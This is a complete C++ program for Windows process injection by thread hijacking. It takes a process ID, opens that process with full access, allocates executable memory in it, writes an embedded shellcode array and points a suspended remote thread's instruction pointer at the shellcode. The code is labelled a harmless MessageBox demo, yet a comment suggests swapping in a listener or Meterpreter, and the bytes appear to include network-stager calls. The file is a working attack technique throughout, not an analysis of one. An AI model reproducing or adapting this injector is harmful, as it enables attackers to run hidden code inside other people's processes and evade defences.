#include <iostream>
#include <Windows.h>

// Shellcode for MessageBox. It can be for other payloads BTW ;)
// For instance, the shellcode can be a listner or meterpreter.
unsigned char shellcode[] = {
    0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xd0, 0x00, 0x00, 0x00, 0x41,
    0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60,
    0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f,
    0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02,
    0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51,
    0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00,
    0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18,
    0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b,
    0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1,
    0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08,
    0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66,
    0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04,
    0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41,
    0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59,
    0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x4f, 0xff, 0xff, 0xff, 0x5d, 0x48, 0x31, 0xc9, 0x41,
    0x51, 0xe8, 0x3c, 0x00, 0x00, 0x00, 0x48, 0x89, 0xc1, 0x48, 0xff, 0xc9, 0x41, 0x51,
    0xe8, 0x2d, 0x00, 0x00, 0x00, 0x48, 0x89, 0xc2, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
    0x41, 0x51, 0x41, 0x51, 0xe8, 0x1a, 0x00, 0x00, 0x00, 0x48, 0x89, 0xc1, 0x48, 0x31,
    0xd2, 0x41, 0x51, 0xe8, 0x0b, 0x00, 0x00, 0x00, 0x48, 0x89, 0xc6, 0x48, 0x31, 0xc0,
    0x41, 0x51, 0xff, 0xe6, 0xe8, 0x07, 0x00, 0x00, 0x00, 0x48, 0x65, 0x6c, 0x6c, 0x6f,
    0x21, 0x00, 0xe8, 0x0c, 0x00, 0x00, 0x00, 0x48, 0x65, 0x6c, 0x6c, 0x6f, 0x20, 0x57,
    0x6f, 0x72, 0x6c, 0x64, 0x00, 0x41, 0xbe, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x48,
    0x89, 0xc6, 0x6a, 0x0a, 0x41, 0x59, 0x50, 0x50, 0x4d, 0x31, 0xc9, 0x4d, 0x31, 0xc0,
    0x48, 0xff, 0xc0, 0x48, 0x89, 0xc2, 0x48, 0xff, 0xc0, 0x48, 0x89, 0xc1, 0x41, 0xba,
    0xea, 0x0f, 0xdf, 0xe0, 0xff, 0xd5, 0x48, 0x89, 0xc7, 0x6a, 0x10, 0x41, 0x58, 0x4c,
    0x89, 0xe2, 0x48, 0x89, 0xf9, 0x41, 0xba, 0x99, 0xa5, 0x74, 0x61, 0xff, 0xd5, 0x48,
    0x81, 0xc4, 0x40, 0x02, 0x00, 0x00, 0x48, 0x83, 0xec, 0x10, 0x48, 0x89, 0xe2, 0x4d,
    0x31, 0xc9, 0x6a, 0x04, 0x41, 0x58, 0x48, 0x89, 0xf9, 0x41, 0xba, 0x02, 0xd9, 0xc8,
    0x5f, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x20, 0x5e, 0x6a, 0x40, 0x41, 0x59, 0x68, 0x00,
    0x10, 0x00, 0x00, 0x41, 0x58, 0x48, 0x89, 0xf2, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x58,
    0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x48, 0x89, 0xc3, 0x49, 0x89, 0xc7, 0x4d, 0x31, 0xc9,
    0x49, 0x89, 0xf0, 0x48, 0x89, 0xda, 0x48, 0x89, 0xf9, 0x41, 0xba, 0x02, 0xd9, 0xc8,
    0x5f, 0xff, 0xd5, 0x48, 0x01, 0xc3, 0x48, 0x29, 0xc6, 0x48, 0x85, 0xf6, 0x75, 0xe1,
    0x41, 0xff, 0xe7
};

SIZE_T shellcodeSize = sizeof(shellcode);

void F() {
    return;
}

void JustPauseForIP() {
    std::cout << "[+] Printing current instruction pointer for the thread to execute...\n";
    std::cout << "[+] Press enter to continue..\n";
    system("pause");
}

void PrintNextIP(DWORD64 ip) {
    std::cout << "[+] Next instruction have the address: 0x" << ip << std::endl;
}

// Syntax: [remote.exe] [running_process_id] 
int main(char argc, char * argv[]) {

	if (argc != 2) {
		std::cout << "[-] Wrong usage. Parameters required is 2.\n";
		return 1;
	}

	// Open running process with certain id
	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, TRUE, atoi(argv[1]));
	if (hProc == nullptr) {
		std::cout << "[-] Process with ID: " << argv[1] << " Could not be opened. Error-> " << GetLastError() << std::endl;
		CloseHandle(hProc);
		return 1;
	}

	// Allocate memory in the process 
    LPVOID reservedMemory = VirtualAllocEx(hProc, nullptr, shellcodeSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (reservedMemory == nullptr) {
        std::cout << "[-] Could not allocted memory in the process with ID: " << argv[1] <<", Error-> " << GetLastError() << std::endl;
        //VirtualFreeEx(hProc, reservedMemory, shellcodeSize, MEM_DECOMMIT);
        CloseHandle(hProc);
        return 1;
    }

    // Write the shellcode in the memory allocated
    BOOL bWriteShellcode = WriteProcessMemory(hProc, reservedMemory, shellcode, shellcodeSize, nullptr);
    if (!bWriteShellcode) {
        std::cout << "[-] Could not write in process memory with ID: " << argv[1] << ", Error-> " << GetLastError() << std::endl;
        VirtualFreeEx(hProc, reservedMemory, shellcodeSize, MEM_DECOMMIT);
        CloseHandle(hProc);
        return 1;
    }

    // Create remote thread in the required process, susoension -> modify instruction pointer
    DWORD threadID = 0;
    HANDLE hThread = CreateRemoteThread(hProc, nullptr, 0, (LPTHREAD_START_ROUTINE)F, nullptr, CREATE_SUSPENDED, &threadID);
    if (hThread == nullptr) {
        std::cout << "[-] Could not create remote thread. Error-> " << GetLastError() << std::endl;
        VirtualFreeEx(hProc, reservedMemory, shellcodeSize, MEM_DECOMMIT);
        CloseHandle(hProc);
        return 1;
    }

    CONTEXT context;
    context.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(hThread, &context)) {
        std::cout << "[-] Could not get thread context. Error-> " << GetLastError() << std::endl;
        VirtualFreeEx(hProc, reservedMemory, shellcodeSize, MEM_DECOMMIT);
        CloseHandle(hProc); 
        CloseHandle(hThread);
        return 1;
    }

    JustPauseForIP();
    PrintNextIP(context.Rip);

    // Change the IP to the memory address that holds the shellcode
    context.Rip = (DWORD64)reservedMemory;

    // Set the new context with the remote thread
    if (!SetThreadContext(hThread, &context)) {
        std::cout << "[-] Could not set thread context. Error-> " << GetLastError() << std::endl;
        VirtualFreeEx(hProc, reservedMemory, shellcodeSize, MEM_DECOMMIT);
        CloseHandle(hProc);
        CloseHandle(hThread);
        return 1;
    }

    PrintNextIP(context.Rip);

    DWORD resumeThread = ResumeThread(hThread);
    if (resumeThread == (DWORD)-1) {
        std::cout << "[-] Could not resume thread execution. Error-> " << GetLastError() << std::endl;
        VirtualFreeEx(hProc, reservedMemory, shellcodeSize, MEM_DECOMMIT);
        CloseHandle(hProc);
        CloseHandle(hThread);
    }

    // Wait for the thread to execute
    WaitForSingleObject(hThread, INFINITE);

    std::cout << "[+] Shellcode executed successfully!!\n";
    CloseHandle(hProc);
    CloseHandle(hThread);
    VirtualFreeEx(hProc, reservedMemory, shellcodeSize, MEM_DECOMMIT);

	return EXIT_SUCCESS;
}
